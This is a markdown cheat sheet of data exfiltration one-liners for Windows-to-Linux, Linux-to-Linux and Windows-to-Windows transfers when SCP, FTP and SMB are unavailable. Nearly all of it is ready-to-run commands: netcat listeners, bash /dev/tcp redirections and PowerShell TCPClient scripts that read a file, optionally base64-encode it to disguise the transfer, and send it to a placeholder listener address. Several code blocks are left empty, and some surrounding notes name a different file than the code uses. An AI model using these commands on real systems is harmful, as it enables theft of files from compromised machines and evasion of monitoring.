# Data Exfiltration Techniques
#### This is a list of some data exfiltration techniques if you don't have access to SCP, FTP, SMB, etc.

***
***

### Windows To Linux

#### Send a file from a *remote* Windows client to a *local* Linux host

##### If you want to send the raw contents:

###### &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Setup a Netcat listener on the *local* Linux host:

```
nc -lp %ListeningPort% > /path/to/store/file.ext
```

###### &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; On the *remote* Windows client run the following in PowerShell:

```
$FilePath = "$pwd\file.ext"; $LHost = "%ListenerAddress%"; $LPort = %ListeningPort%; $FileContents = [System.IO.File]::ReadAllBytes($FilePath); $TCPClient = New-Object Net.Sockets.TCPClient($LHost, $LPort); $NetworkStream = $TCPClient.GetStream(); $NetworkStream.Write($FileContents, 0, $FileContents.Length); $NetworkStream.Close(); $TCPClient.Close()
```

###### If not running from the same directory as the file location, then change ```$pwd\file.txt``` to the proper filepath.

##### If you want to obfuscate the data being transfered by converting it to a base64 string:

###### &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Setup a Netcat listener on the *local* Linux host:

```
nc -lp %ListeningPort% | base64 -d > /path/to/store/file.ext
```

###### &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; On the *remote* Windows client run the following in PowerShell:

```
$FilePath = "$pwd\file.ext"; $LHost = "%ListenerAddress%"; $LPort = %ListeningPort%; $Base64String = [System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes("$FilePath")); $TCPClient = New-Object Net.Sockets.TCPClient($LHost, $LPort); $NetworkStream = $TCPClient.GetStream(); $StreamWriter = New-Object IO.StreamWriter($NetworkStream); $StreamWriter.AutoFlush = $true; $StreamWriter.Write($Base64String); $StreamWriter.Close(); $NetworkStream.Close(); $TCPClient.Close()
```

###### If not running from the same directory as the file location, then change ```$pwd\file.txt``` to the proper filepath.

***

#### Retrieve a file from a *remote* Windows client to a *local* Linux host

##### If you want to send the raw contents:

###### &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Setup a PowerShell listener on the *remote* Windows client:

```
$FilePath = "$pwd\file.ext"; $LPort = %ListeningPort%; $Listener = [System.Net.Sockets.TcpListener]::Create($LPORT); $Listener.Start(); $TCPClient = $Listener.AcceptTcpClient(); $NetworkStream = $TCPClient.GetStream(); $FileContents = [System.IO.File]::ReadAllBytes($FilePath); $NetworkStream.Write($FileContents, 0, $FileContents.Length); $NetworkStream.Close(); $TCPClient.Close(); $Listener.Stop()
```

###### If not running from the same directory as the file location, then change ```$pwd\file.txt``` to the proper filepath.

###### &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; On the *local* Linux host connect back with Netcat:

```
nc %ListenerAddress% %ListeningPort% > /path/to/store/file.ext
```

###### &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; If Netcat is unavailable, on the *local* Linux host connect back with bash:

```

```

##### If you want to obfuscate the data being transfered by converting it to a base64 string:

###### &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Setup a PowerShell listener on the *remote* Windows client:

```
$FilePath = "$pwd\file.ext"; $LPort = %ListeningPort%; $Base64String = [System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes("$FilePath")); $Listener = [System.Net.Sockets.TcpListener]::Create($LPORT); $Listener.Start(); $TCPClient = $Listener.AcceptTcpClient(); $NetworkStream = $TCPClient.GetStream(); $StreamWriter = New-Object IO.StreamWriter($NetworkStream); $StreamWriter.AutoFlush = $true; $StreamWriter.Write($Base64String); $StreamWriter.Close(); $NetworkStream.Close(); $TCPClient.Close(); $Listener.Stop()
```

###### If not running from the same directory as the file location, then change ```$pwd\file.txt``` to the proper filepath.

###### &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; On the *local* Linux host connect back with Netcat:

```
nc %ListenerAddress% %ListeningPort% | base64 -d > /path/to/store/file.ext
```

###### &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; If Netcat is unavailable, on the *local* Linux host connect back with bash:

```

```

***
***

### Linux To Linux

#### Send file from *remote* Linux client to *local* Linux host

##### If you want to send the raw contents:

###### &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Setup a Netcat listener on the *local* Linux host:

```
nc -lp port > /path/to/store/file.ext
```

###### &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; On the *remote* Linux client connect back with Netcat:

```
nc -q 0 %ListenerAddress% %ListeningPort% < /path/to/sending/file.ext
```

###### &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; If Netcat is unavailable, on the *remote* Linux client connect back with bash:

```
cat /path/to/sending/file.ext >& /dev/tcp/%ListenerAddress%/%ListenerPort%
```

##### If you want to obfuscate the data being transfered by converting it to a base64 string:

###### &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Setup a Netcat listener on the *local* Linux host:

```
nc -lp %ListeningPort% | base64 -d > /path/to/store/file.ext
```

###### &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; On the *remote* Linux client connect back with Netcat:

```
base64 -w0 /path/to/sending/file.ext | nc -q 0 %ListenerAddress% %ListeningPort%
```

###### &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; If Netcat is unavailable, on the *remote* Linux client connect back with bash:

```
base64 -w0 /path/to/sending/file.ext >& /dev/tcp/%ListenerAddress%/%ListenerPort%
```

***

#### Retrieve a file from a *remote* Linux client to a *local* Linux host

##### If you want to send the raw contents:

###### &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Setup a Netcat listener on the *remote* Linux client:

```
nc -q 0 -lp %ListenerPort% < /path/to/sending/file.ext
```

###### &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; On the *local* Linux host connect back with Netcat:

```
nc %ListenerAddress% %ListeningPort% > /path/to/store/file.ext
```

###### &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; If Netcat is unavailable, on the *local* Linux host connect back with bash:

```

```

##### If you want to obfuscate the data being transfered by converting it to a base64 string:

###### &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Setup a Netcat listener on the *remote* Linux client:

```
base64 -w0 /path/to/sending/file.ext | nc -q 0 -lp %ListeningPort%
```

###### &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; On the *local* Linux host connect back with Netcat:

```
nc %ListenerAddress% %ListeningPort% | base64 -d > /path/to/store/file.ext
```

###### &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; If Netcat is unavailable, on the *local* Linux host connect back with bash:

```

```

***
***

### Windows To Windows

#### Send file from *remote* Windows client to *local* Windows host

##### If you want to send the raw contents:

###### &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Setup a PowerShell listener on the *local* Windows host:

```

```

###### If not running from the same directory as the file location, then change ```$pwd\file.txt``` to the proper filepath.

###### &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; On the *remote* Windows client run the following in PowerShell:

```
$FilePath = "$pwd\file.ext"; $LHost = "%ListenerAddress%"; $LPort = %ListeningPort%; $FileContents = [System.IO.File]::ReadAllBytes($FilePath); $TCPClient = New-Object Net.Sockets.TCPClient($LHost, $LPort); $NetworkStream = $TCPClient.GetStream(); $NetworkStream.Write($FileContents, 0, $FileContents.Length); $NetworkStream.Close(); $TCPClient.Close()
```

###### If not running from the same directory as the file location, then change ```$pwd\file.txt``` to the proper filepath.

##### If you want to obfuscate the data being transfered by converting it to a base64 string:

###### &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Setup a PowerShell listener on the *local* Windows host:

```

```
###### If not running from the same directory as the file location, then change ```$pwd\file.txt``` to the proper filepath.

###### &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; On the *remote* Windows client run the following in PowerShell:

```
$FilePath = "$pwd\file.ext"; $LHost = "%ListenerAddress%"; $LPort = %ListeningPort%; $Base64String = [System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes("$FilePath")); $TCPClient = New-Object Net.Sockets.TCPClient($LHost, $LPort); $NetworkStream = $TCPClient.GetStream(); $StreamWriter = New-Object IO.StreamWriter($NetworkStream); $StreamWriter.AutoFlush = $true; $StreamWriter.Write($Base64String); $StreamWriter.Close(); $NetworkStream.Close(); $TCPClient.Close()
```

###### If not running from the same directory as the file location, then change ```$pwd\file.txt``` to the proper filepath.

***

#### Retrieve a file from a *remote* Windows client to a *local* Windows host

##### If you want to send the raw contents:

###### &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Setup a PowerShell listener on the *remote* Windows client:

```
$FilePath = "$pwd\file.ext"; $LPort = %ListeningPort%; $Listener = [System.Net.Sockets.TcpListener]::Create($LPORT); $Listener.Start(); $TCPClient = $Listener.AcceptTcpClient(); $NetworkStream = $TCPClient.GetStream(); $FileContents = [System.IO.File]::ReadAllBytes($FilePath); $NetworkStream.Write($FileContents, 0, $FileContents.Length); $NetworkStream.Close(); $TCPClient.Close(); $Listener.Stop()
```

###### If not running from the same directory as the file location, then change ```$pwd\file.txt``` to the proper filepath.

###### &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; On the *local* Windows client run the following in PowerShell:

```
$FilePath = "$pwd\file.ext"; $LHost = "%ListenerAddress%"; $LPort = %ListeningPort%; $TCPClient = New-Object Net.Sockets.TCPClient($LHost, $LPort); $NetworkStream = $TCPClient.GetStream(); $File = [System.IO.File]::OpenWrite("$FilePath"); $Buffer = New-Object byte[] 1024; while ($true) { $BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length); if ($BytesRead -eq 0) { break }; $File.Write($Buffer, 0, $BytesRead) }; $File.Close(); $NetworkStream.Close(); $TCPClient.Close()
```


##### If you want to obfuscate the data being transfered by converting it to a base64 string:

###### &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Setup a PowerShell listener on the *remote* Windows host:

```
$FilePath = "$pwd\file.ext"; $LPort = %ListeningPort%; $Base64String = [System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes("$FilePath")); $Listener = [System.Net.Sockets.TcpListener]::Create($LPORT); $Listener.Start(); $TCPClient = $Listener.AcceptTcpClient(); $NetworkStream = $TCPClient.GetStream(); $StreamWriter = New-Object IO.StreamWriter($NetworkStream); $StreamWriter.AutoFlush = $true; $StreamWriter.Write($Base64String); $StreamWriter.Close(); $NetworkStream.Close(); $TCPClient.Close(); $Listener.Stop()
```

###### If not running from the same directory as the file location, then change ```$pwd\file.txt``` to the proper filepath.

###### &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; On the *local* Windows client run the following in PowerShell:

```

```

###### If not running from the same directory as the file location, then change ```$pwd\file.txt``` to the proper filepath.
